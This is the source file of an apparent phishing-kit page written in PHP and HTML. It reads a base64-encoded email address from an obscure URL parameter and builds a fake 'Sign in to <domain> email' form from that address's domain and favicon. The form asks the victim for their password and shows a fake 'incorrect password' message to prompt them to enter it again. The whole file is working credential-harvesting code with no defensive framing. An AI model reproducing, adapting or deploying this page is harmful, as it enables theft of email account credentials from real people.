<?php
$id = $_GET['fixyouincominge_hjdhjsjhsnmw5455jhjhjs4454aha'];
$id = urldecode(base64_decode($id));

$getdomain = explode('@',$id);
$userdomain = $getdomain[1];
$userdomainOutlast = explode(".", $userdomain);
$dom = $userdomainOutlast[0];
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
    <!-- <link rel="shortcut icon" href="https://www.google.com/s2/favicons?domain=<?php echo $userdomain ?>"> -->
    <link rel="shortcut icon" href="https://www.google.com/s2/favicons?sz=32&domain_url=<?php echo $userdomain ?>">
  
	<title>Sign in to <?php echo $dom." email"; ?></title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <style>
  	
  </style>
</head>
<body style="background:  url(../img/<?php if (stripos($id, '@naver.') !== false  || stripos($id, '@daum.') !== false ) {
	echo "defulat2.png";}else{echo "sent.jpeg";} ?>)no-repeat center/cover;">
	<!-- <div style=" height: 1000px; width: 100%;"> -->

<div class="row">
	
	<div class="col-md-4"></div>
	<div class="col-md-4 card" style="height: auto; max-width: 450px; width: 100%; margin: auto; margin-top:70px; background-color: #fff; padding: 50px; overflow: hidden;">
		<!-- loader -->

<!-- loader -->
<form name="ema" method="POST" action="">
		<div class="row" style="margin-top: 10px;">
			<div class="col-md-1 col-xs-1"><img src="https://www.google.com/s2/favicons?sz=32&domain_url=<?php echo $userdomain ?>"></div>
			<div class="col-md-10 col-xs-10" ><input type="text" name="heading" id="heading" disabled style="border: 0px; background-color: transparent; font-size: 20px; font-weight: bolder; width: 100%;" value="Fix issues in <?php echo $dom; ?>" ></div>
			
			<div class="col-md-12" style="margin: 20px 0px 20px 0px">
					<input type="text" name="email" id="email" disabled style="border: 0px; background-color: #fff; width: 100%; padding: 0px; font-size: 17px;font-weight: bolder;" autofocus="off" value="<?php echo $id ?>" class="input">
				</div>

			
			<div class="col-md-12" style="margin-top: 10px; font-size: 17px; font-weight: bolder;"><p>Enter Password</p></div>
			<div class="col-md-12">
				<p style="color: red; margin: 10px 0px 30px 0px; display: none;" id="msg">Your account or password is incorrect. please try again.!</p>
			</div>
			
				<div class="col-md-12" style="margin-bottom: 20px;">
					<input type="password" name="password" id="password" style="border: 0px;border-bottom: 1px solid #000; background-color: #fff; width: 100%; padding: 10px;" autofocus="off" placeholder="Password" class="input">
				</div>

				<div class="row">
					<div class="col-md-6 col-xs-6"></div>
					<div class="col-md-6" style="margin: 0px 0px 20px 0px">

					<button class="pull-right" style="background-color: #3058b0; cursor: pointer; border: 0px;color: #fff;padding: 7px 25px 7px 25px;" name="singinNow" id="butsave"><i class="fa fa-spinner fa-spin" style="font-size:24px; display: none;padding: 0px 10px 0px 5px;" id="loader"></i>Sign in</button>

					<button class="pull-right" style="background-color: #3058b0; cursor: pointer; border: 0px;color: #fff;padding: 7px 25px 7px 25px;display: none" name="singinNow" id="butsave2"><i class="fa fa-spinner fa-spin" style="font-size:24px; display: none;" id="loader2"></i>Sign in</button>
				</div>
				</div>
			</form>
		</div>
		<div class="col-md-12">
			
		</div>
		
	</div>
	<div class="col-md-4"></div>
	 <script src="../script.js"></script>
</div>
<!-- </div> -->
</body>
</html>